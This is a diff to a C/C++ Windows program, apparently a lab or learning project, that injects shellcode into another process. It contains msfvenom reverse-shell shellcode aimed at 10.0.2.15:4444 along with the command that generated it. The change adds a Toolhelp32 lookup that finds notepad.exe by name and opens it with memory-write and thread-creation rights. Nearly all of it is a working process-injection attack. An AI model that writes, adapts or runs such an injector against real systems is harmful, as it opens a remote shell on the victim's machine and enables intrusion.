@@ -1,7 +1,33 @@
-#include <stdio.h>
+#include <iostream>
+#include <string>
 #include <windows.h>
+#include <tlhelp32.h>
 
+
+DWORD GetProcessID(const std::wstring& processName) {
+    DWORD processID = 0;
+    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hProcessSnap == INVALID_HANDLE_VALUE) {
+        return 0;
+    }
+
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (Process32FirstW(hProcessSnap, &pe32)) {
+        do {
+            if (processName == pe32.szExeFile) {
+                processID = pe32.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(hProcessSnap, &pe32));
+    }
+
+    CloseHandle(hProcessSnap);
+    return processID;
+}
 int main() {
+
 	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c
 	char shellcode[] = { "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 						"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -38,11 +64,24 @@ int main() {
 						"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
 	};
 
+	std::wstring name = L"notepad.exe";
+	DWORD pid = GetProcessID(name);
+
+	/*
+	if(pid < 0){
+		std::cerr << "GetProcessID failed with error " << GetLastError() << "\n";
+	} else {
+		std::cout << "PID of notepad.exe " << pid << "\n";
+	}
+	std::cin.get();
+	exit(0);
+	*/
+
 	HANDLE hProcess; //handle used to store the remote process's handle, used for openProcess
 	HANDLE hThread;
 	void* exec_mem;
 
-	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, 1244);
+	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
 	if (hProcess == NULL) {
 		printf("OpenProcess failed with error %d\n", GetLastError());
 		return 1;
